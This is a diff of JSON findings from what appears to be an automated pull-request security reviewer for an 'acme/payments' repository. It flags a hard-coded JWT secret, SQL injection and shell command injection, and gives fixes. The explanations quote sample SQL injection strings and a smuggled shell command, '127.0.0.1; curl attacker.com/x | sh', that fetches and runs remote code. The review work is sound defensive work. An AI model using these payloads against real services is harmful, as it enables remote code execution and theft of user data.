@@ -1,6 +1,6 @@
 {
   "schema_version": 1,
-  "generated_at": 1789414437,
+  "generated_at": 1789424648,
   "generator": "resolvepr 0.1.0-dev · claude-opus-5",
   "pr": {
     "repo": "acme/payments",
@@ -110,7 +110,6 @@
             "start_line": 1,
             "end_line": 38,
             "changed_lines": [
-              4,
               8
             ]
           }
@@ -150,11 +149,11 @@
       "line": 32,
       "cwe": "CWE-798",
       "severity": "CRITICAL",
-      "summary": "The JWT signing secret is a hard-coded string literal ('supersecret123') in signToken instead of being loaded from configuration or environment.",
-      "why_it_matters": "Anyone with access to the source or binary can extract the secret and forge arbitrary JWTs (e.g. an admin token), fully bypassing authentication.",
-      "fix_patch": "\tsecret := []byte(os.Getenv(\"JWT_SIGNING_SECRET\"))\n\tif len(secret) == 0 {\n\t\treturn \"\", errors.New(\"JWT_SIGNING_SECRET is not set\")\n\t}",
+      "summary": "The JWT signing key is a hardcoded literal ('supersecret123') committed in source instead of loaded from configuration/environment.",
+      "why_it_matters": "Anyone with access to the repository or binary can extract the secret and forge JWTs for any user, achieving full authentication bypass and privilege escalation.",
+      "fix_patch": "\tsecret := []byte(os.Getenv(\"JWT_SIGNING_SECRET\"))\n\tif len(secret) == 0 {\n\t\treturn \"\", errors.New(\"JWT_SIGNING_SECRET is not configured\")\n\t}",
       "confidence": 0.99,
-      "created_at": 1789414419,
+      "created_at": 1789424631,
       "status": "open"
     },
     {
@@ -166,10 +165,10 @@
       "cwe": "CWE-89",
       "severity": "HIGH",
       "summary": "The user-supplied 'q' parameter is concatenated directly into the SQL query string in searchUsers without parameterisation or escaping.",
-      "why_it_matters": "An attacker can submit a search term like ' OR '1'='1 or ' UNION SELECT password FROM users-- to dump every user record including credentials.",
+      "why_it_matters": "An attacker can submit a name like ' OR '1'='1 or append a UNION SELECT to dump the entire users table, including password hashes.",
       "fix_patch": "\trows, err := db.Query(\"SELECT * FROM users WHERE name = ?\", q)",
       "confidence": 0.99,
-      "created_at": 1789414419,
+      "created_at": 1789424631,
       "status": "open"
     },
     {
@@ -181,10 +180,10 @@
       "cwe": "CWE-78",
       "severity": "CRITICAL",
       "summary": "The 'host' parameter is concatenated into a shell command executed via sh -c in pingHost, allowing arbitrary command injection.",
-      "why_it_matters": "An attacker supplying a host like '127.0.0.1; curl attacker.com/x | sh' achieves remote code execution as the service user.",
+      "why_it_matters": "An attacker supplying a host like '127.0.0.1; curl attacker.com/x.sh | sh' achieves remote code execution as the service user.",
       "fix_patch": "\treturn exec.Command(\"ping\", \"-c\", \"1\", \"--\", host).Output()",
       "confidence": 0.99,
-      "created_at": 1789414419,
+      "created_at": 1789424631,
       "status": "open"
     }
   ],
@@ -192,6 +191,6 @@
     "files": 4,
     "chunks": 5,
     "llm_calls": 5,
-    "duration_ms": 17727
+    "duration_ms": 16849
   }
 }
